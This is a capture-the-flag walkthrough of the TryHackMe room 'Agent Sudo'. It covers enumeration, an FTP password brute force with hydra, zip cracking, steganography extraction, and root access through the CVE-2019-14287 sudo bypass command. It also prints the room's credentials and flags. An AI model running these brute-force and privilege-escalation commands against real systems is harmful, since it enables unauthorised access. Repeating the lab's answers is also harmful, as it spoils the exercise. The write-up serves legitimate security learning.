# 🕵️ TryHackMe – Agent Sudo

## 🧾 Event Details

**Platform:** TryHackMe  
**Room Name:** Agent Sudo  
**Scenario:**  
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

---

## 🔍 Vulnerability Discovery

### 🔎 Service Enumeration

Initial scan with `rustscan`:

\```bash
rustscan -a <IP_ADDRESS>
\```

**Results:**

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
```

### 🕵️ Web Clue Discovery

Accessing port 80 displayed a message from **Agent R**:
> "Use your own codename as user-agent to access the site."

---

## 💥 Exploitation

### 🧑‍💻 User-Agent Manipulation

Using `Burp Suite`, the correct User-Agent was discovered to be:

```
Agent C
```

Redirects to `agent_C_attention.php`, revealing:
- Agent C = Chris
- Password is weak

### 🔐 FTP Brute Force

Used `hydra` to brute-force FTP login for user `chris`:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.49.137.239
```

**Credentials:**

```
Username: chris
Password: crystal
```

### 📂 FTP File Discovery

Files found on FTP:

```
To_agentJ.txt
cutie.png
cute-alien.jpg
```

Transferred files to local machine for analysis.

---

### 🔍 PNG File Analysis - `cutie.png`

Initial clues via `strings` and `binwalk`:

```bash
binwalk cutie.png
```

```
Zip archive data, encrypted, name: To_agentR.txt
```

Extracted with:

```bash
binwalk -e cutie.png
cd _cutie.png.extracted
```

Cracked zip password with `john`:

```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Zip Password:** `alien`

Decompressed:

```bash
7z x 8702.zip
```

Contents of `To_agentR.txt`:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Decoded Base64:

```bash
echo 'QXJlYTUx' | base64 -d
```

**Result:**

```
Area51
```

---

### 👽 JPEG Steganography - `cute-alien.jpg`

Checked with `steghide`:

```bash
steghide extract -sf cute-alien.jpg
```

**Passphrase:** `Area51`

Extracted file: `message.txt`

Contents:

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password looks cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

---

### 🔐 SSH Login

```bash
ssh james@<IP_ADDRESS>
Password: hackerrules!
```

Successfully gained user shell access.

---

## 🚀 Privilege Escalation

### 🔍 Sudo Permissions

```bash
sudo -l
```

**Output:**

```
(ALL, !root) /bin/bash
```

### ⚠️ Sudo Vulnerability (CVE-2019-14287)

Identified vulnerable version:

```bash
sudo -V
```

```
Sudo version 1.8.21p2
```

Exploited with:

```bash
sudo -u#-1 /bin/bash
```

Root shell obtained ✅

---

## 🏁 Flags

### 🧍 User Flag

```bash
cat user.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```

### 👑 Root Flag

```bash
cat /root/root.txt
```

```
b53a02f55b57d4439e3341834d70c062
```

---

## 🧠 Conclusion & Takeaways

- 🔍 Think Like a Hacker: The User-Agent hint was a classic example of obscurity-based access control. Always inspect HTTP headers and responses carefully for hidden logic.

- 🕵️‍♀️ Layered Steganography: Real-world and CTF scenarios often hide secrets in layers. Steganography isn't just hiding messages in images — it can include compressed archives, hidden file headers, or even chained encoding.

- 🗝️ Weak Credentials = Easy Target: The FTP access relied entirely on a weak password (crystal). In practice, such credentials are still common and a major vulnerability.

- 🐚 Misconfigured Sudo is Dangerous: The (ALL, !root) configuration might appear secure at first glance, but older sudo versions are vulnerable to UID-based bypasses like -1. Always validate sudo versions and patch known CVEs.

- 📚 Toolset Matters: Having the right tools (hydra, binwalk, steghide, john, Burp Suite, etc.) and knowing how to use them effectively is essential in red team operations.

- 🔐 Always Validate File Metadata and Hidden Data: Files may contain more than what they visually present. Use tools like strings, exiftool, and binwalk to analyze all layers.

- 🚨 Stay Updated: Vulnerabilities like CVE-2019-14287 are perfect examples of how a misconfiguration or overlooked update can lead to full root compromise.

- 🎯 Report, Reflect, Repeat: After every successful exploitation, documenting the process not only helps in knowledge sharing but also in reinforcing your own understanding.

---

## 🛠️ Tools Used

- `rustscan`
- `hydra`
- `binwalk`
- `zip2john`, `john`
- `steghide`
- `Burp Suite`
- `ssh`, `sudo`
- `base64`
- `7z`, `strings`, `exiftool`

✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
